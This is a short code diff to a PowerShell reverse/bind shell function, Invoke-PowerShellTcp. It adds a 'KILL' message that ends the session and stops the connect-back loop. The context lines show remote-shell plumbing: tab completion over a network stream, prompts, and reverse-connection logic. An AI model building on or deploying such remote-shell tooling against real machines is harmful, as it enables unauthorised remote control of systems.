@@ -146,6 +146,9 @@ function Invoke-PowerShellTcp
                 if ($output.gettype() -eq [System.String]) { $output = @($output) }
 
                 Write-ShellPacket @{ "msg_type" = "TABCOMPL"; "data" = $output } $stream
+            } elseif ($packet.msg_type -eq "KILL") {
+                $killed = $true
+                Exit
             }
 
             Write-ShellPacket (Get-ShellPrompt) $stream
@@ -154,7 +157,8 @@ function Invoke-PowerShellTcp
 
     $start_time = Get-Date
     $now = Get-Date
-    while ( ($now - $start_time).TotalDays -lt $LifeTime ) {
+    $killed = $false
+    while ( ($now - $start_time).TotalDays -lt $LifeTime -and -not $killed) {
         #Connect back if the reverse switch is used.
         if ($Reverse)
         {
